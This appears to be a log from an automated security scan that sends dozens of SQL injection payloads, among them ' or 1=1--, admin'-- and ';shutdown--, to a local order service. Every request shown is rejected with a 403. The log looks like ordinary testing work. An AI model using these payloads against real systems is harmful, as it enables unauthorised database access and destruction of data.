[INFO]00:18:14:016-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' or 1=1 or 'x'='y\n"}}
[INFO]00:18:14:017-caseScan.py:113 >> code: 403
[INFO]00:18:14:018-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:046-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "/\n"}}
[INFO]00:18:14:047-caseScan.py:113 >> code: 403
[INFO]00:18:14:047-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:076-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "//\n"}}
[INFO]00:18:14:076-caseScan.py:113 >> code: 403
[INFO]00:18:14:077-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:104-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "//*\n"}}
[INFO]00:18:14:105-caseScan.py:113 >> code: 403
[INFO]00:18:14:105-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:133-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*/*\n"}}
[INFO]00:18:14:134-caseScan.py:113 >> code: 403
[INFO]00:18:14:134-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:162-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "a' or 3=3--\n"}}
[INFO]00:18:14:163-caseScan.py:113 >> code: 403
[INFO]00:18:14:163-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:192-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\"a\"\" or 3=3--\"\n"}}
[INFO]00:18:14:192-caseScan.py:113 >> code: 403
[INFO]00:18:14:193-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:221-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 3=3\n"}}
[INFO]00:18:14:221-caseScan.py:113 >> code: 403
[INFO]00:18:14:222-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:250-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\u2018 or 3=3 --\n"}}
[INFO]00:18:14:251-caseScan.py:113 >> code: 403
[INFO]00:18:14:251-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:282-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "c"}}
[INFO]00:18:14:282-caseScan.py:113 >> code: 403
[INFO]00:18:14:283-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:14:318-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'\n"}}
[INFO]00:18:14:319-caseScan.py:113 >> code: 403
[INFO]00:18:14:319-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:345-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\"\n"}}
[INFO]00:18:14:346-caseScan.py:113 >> code: 403
[INFO]00:18:14:346-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:373-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "#\n"}}
[INFO]00:18:14:374-caseScan.py:113 >> code: 403
[INFO]00:18:14:374-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:402-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "-\n"}}
[INFO]00:18:14:403-caseScan.py:113 >> code: 403
[INFO]00:18:14:403-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:431-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "--\n"}}
[INFO]00:18:14:431-caseScan.py:113 >> code: 403
[INFO]00:18:14:432-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:459-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' --\n"}}
[INFO]00:18:14:460-caseScan.py:113 >> code: 403
[INFO]00:18:14:461-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:488-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "--';\n"}}
[INFO]00:18:14:489-caseScan.py:113 >> code: 403
[INFO]00:18:14:489-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:516-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' ;\n"}}
[INFO]00:18:14:517-caseScan.py:113 >> code: 403
[INFO]00:18:14:517-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:543-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "= '\n"}}
[INFO]00:18:14:543-caseScan.py:113 >> code: 403
[INFO]00:18:14:544-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:570-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "= ;\n"}}
[INFO]00:18:14:571-caseScan.py:113 >> code: 403
[INFO]00:18:14:571-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:596-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "= --\n"}}
[INFO]00:18:14:596-caseScan.py:113 >> code: 403
[INFO]00:18:14:598-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:626-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x23\n"}}
[INFO]00:18:14:626-caseScan.py:113 >> code: 403
[INFO]00:18:14:627-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:653-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x27\n"}}
[INFO]00:18:14:654-caseScan.py:113 >> code: 403
[INFO]00:18:14:654-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:682-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x3D \\x3B'\n"}}
[INFO]00:18:14:683-caseScan.py:113 >> code: 403
[INFO]00:18:14:683-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:709-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x3D \\x27\n"}}
[INFO]00:18:14:710-caseScan.py:113 >> code: 403
[INFO]00:18:14:710-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:737-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x27\\x4F\\x52 SELECT *\n"}}
[INFO]00:18:14:737-caseScan.py:113 >> code: 403
[INFO]00:18:14:738-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:766-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x27\\x6F\\x72 SELECT *\n"}}
[INFO]00:18:14:766-caseScan.py:113 >> code: 403
[INFO]00:18:14:767-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:793-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'or select *\n"}}
[INFO]00:18:14:794-caseScan.py:113 >> code: 403
[INFO]00:18:14:794-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:821-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "admin'--\n"}}
[INFO]00:18:14:822-caseScan.py:113 >> code: 403
[INFO]00:18:14:822-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:851-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "';shutdown--\n"}}
[INFO]00:18:14:851-caseScan.py:113 >> code: 403
[INFO]00:18:14:852-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:878-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "<>\"'%;)(&+\n"}}
[INFO]00:18:14:879-caseScan.py:113 >> code: 403
[INFO]00:18:14:879-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:906-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or ''='\n"}}
[INFO]00:18:14:907-caseScan.py:113 >> code: 403
[INFO]00:18:14:908-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:935-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 'x'='x\n"}}
[INFO]00:18:14:936-caseScan.py:113 >> code: 403
[INFO]00:18:14:936-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:966-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or \"x\"=\"x\n"}}
[INFO]00:18:14:966-caseScan.py:113 >> code: 403
[INFO]00:18:14:967-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:14:993-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "') or ('x'='x\n"}}
[INFO]00:18:14:994-caseScan.py:113 >> code: 403
[INFO]00:18:14:994-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:024-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "0 or 1=1\n"}}
[INFO]00:18:15:025-caseScan.py:113 >> code: 403
[INFO]00:18:15:025-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:053-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 0=0 --\n"}}
[INFO]00:18:15:053-caseScan.py:113 >> code: 403
[INFO]00:18:15:054-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:084-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or 0=0 --\n"}}
[INFO]00:18:15:085-caseScan.py:113 >> code: 403
[INFO]00:18:15:085-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:112-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or 0=0 --\n"}}
[INFO]00:18:15:114-caseScan.py:113 >> code: 403
[INFO]00:18:15:114-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:141-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 0=0 #\n"}}
[INFO]00:18:15:142-caseScan.py:113 >> code: 403
[INFO]00:18:15:142-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:169-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or 0=0 #\n"}}
[INFO]00:18:15:169-caseScan.py:113 >> code: 403
[INFO]00:18:15:170-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:199-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or 0=0 #\n"}}
[INFO]00:18:15:199-caseScan.py:113 >> code: 403
[INFO]00:18:15:200-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:225-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1--\n"}}
[INFO]00:18:15:226-caseScan.py:113 >> code: 403
[INFO]00:18:15:227-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:252-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or 1=1--\n"}}
[INFO]00:18:15:253-caseScan.py:113 >> code: 403
[INFO]00:18:15:253-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:278-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or '1'='1'--\n"}}
[INFO]00:18:15:279-caseScan.py:113 >> code: 403
[INFO]00:18:15:279-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:305-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\"' or 1 --'\"\n"}}
[INFO]00:18:15:306-caseScan.py:113 >> code: 403
[INFO]00:18:15:306-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:333-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or 1=1--\n"}}
[INFO]00:18:15:333-caseScan.py:113 >> code: 403
[INFO]00:18:15:334-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:359-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or%201=1\n"}}
[INFO]00:18:15:360-caseScan.py:113 >> code: 403
[INFO]00:18:15:360-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:386-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or%201=1 --\n"}}
[INFO]00:18:15:387-caseScan.py:113 >> code: 403
[INFO]00:18:15:387-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:413-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:15:413-caseScan.py:113 >> code: 403
[INFO]00:18:15:414-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:440-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or 1=1 or \"\"=\"\n"}}
[INFO]00:18:15:440-caseScan.py:113 >> code: 403
[INFO]00:18:15:441-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:466-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or a=a--\n"}}
[INFO]00:18:15:467-caseScan.py:113 >> code: 403
[INFO]00:18:15:468-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:493-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or \"a\"=\"a\n"}}
[INFO]00:18:15:493-caseScan.py:113 >> code: 403
[INFO]00:18:15:494-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:520-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "') or ('a'='a\n"}}
[INFO]00:18:15:520-caseScan.py:113 >> code: 403
[INFO]00:18:15:521-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:546-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\") or (\"a\"=\"a\n"}}
[INFO]00:18:15:546-caseScan.py:113 >> code: 403
[INFO]00:18:15:547-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:572-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi\" or \"a\"=\"a\n"}}
[INFO]00:18:15:572-caseScan.py:113 >> code: 403
[INFO]00:18:15:573-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:599-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi\" or 1=1 --\n"}}
[INFO]00:18:15:600-caseScan.py:113 >> code: 403
[INFO]00:18:15:600-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:625-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi' or 1=1 --\n"}}
[INFO]00:18:15:626-caseScan.py:113 >> code: 403
[INFO]00:18:15:626-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:651-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi' or 'a'='a\n"}}
[INFO]00:18:15:652-caseScan.py:113 >> code: 403
[INFO]00:18:15:652-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:678-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi') or ('a'='a\n"}}
[INFO]00:18:15:679-caseScan.py:113 >> code: 403
[INFO]00:18:15:679-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:704-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi\") or (\"a\"=\"a\n"}}
[INFO]00:18:15:704-caseScan.py:113 >> code: 403
[INFO]00:18:15:705-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:730-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'hi' or 'x'='x';\n"}}
[INFO]00:18:15:731-caseScan.py:113 >> code: 403
[INFO]00:18:15:731-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:759-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "@variable\n"}}
[INFO]00:18:15:760-caseScan.py:113 >> code: 403
[INFO]00:18:15:760-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:787-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": ",@variable\n"}}
[INFO]00:18:15:788-caseScan.py:113 >> code: 403
[INFO]00:18:15:789-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:815-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "PRINT\n"}}
[INFO]00:18:15:816-caseScan.py:113 >> code: 403
[INFO]00:18:15:816-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:844-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "PRINT @@variable\n"}}
[INFO]00:18:15:845-caseScan.py:113 >> code: 403
[INFO]00:18:15:845-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:874-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "select\n"}}
[INFO]00:18:15:874-caseScan.py:113 >> code: 403
[INFO]00:18:15:875-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:902-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "insert\n"}}
[INFO]00:18:15:903-caseScan.py:113 >> code: 403
[INFO]00:18:15:903-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:930-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "as\n"}}
[INFO]00:18:15:931-caseScan.py:113 >> code: 403
[INFO]00:18:15:931-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:957-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or\n"}}
[INFO]00:18:15:958-caseScan.py:113 >> code: 403
[INFO]00:18:15:958-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:15:984-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "procedure\n"}}
[INFO]00:18:15:985-caseScan.py:113 >> code: 403
[INFO]00:18:15:985-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:010-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "limit\n"}}
[INFO]00:18:16:011-caseScan.py:113 >> code: 403
[INFO]00:18:16:012-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:037-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "order by\n"}}
[INFO]00:18:16:037-caseScan.py:113 >> code: 403
[INFO]00:18:16:038-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:064-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "asc\n"}}
[INFO]00:18:16:065-caseScan.py:113 >> code: 403
[INFO]00:18:16:065-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:090-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "desc\n"}}
[INFO]00:18:16:091-caseScan.py:113 >> code: 403
[INFO]00:18:16:092-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:120-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "delete\n"}}
[INFO]00:18:16:121-caseScan.py:113 >> code: 403
[INFO]00:18:16:121-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:149-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "update\n"}}
[INFO]00:18:16:150-caseScan.py:113 >> code: 403
[INFO]00:18:16:151-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:177-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "distinct\n"}}
[INFO]00:18:16:177-caseScan.py:113 >> code: 403
[INFO]00:18:16:178-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:206-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "having\n"}}
[INFO]00:18:16:206-caseScan.py:113 >> code: 403
[INFO]00:18:16:207-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:234-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "truncate\n"}}
[INFO]00:18:16:235-caseScan.py:113 >> code: 403
[INFO]00:18:16:236-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:263-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "replace\n"}}
[INFO]00:18:16:264-caseScan.py:113 >> code: 403
[INFO]00:18:16:264-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:291-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "like\n"}}
[INFO]00:18:16:292-caseScan.py:113 >> code: 403
[INFO]00:18:16:292-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:320-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "handler\n"}}
[INFO]00:18:16:321-caseScan.py:113 >> code: 403
[INFO]00:18:16:321-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:348-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "bfilename\n"}}
[INFO]00:18:16:349-caseScan.py:113 >> code: 403
[INFO]00:18:16:349-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

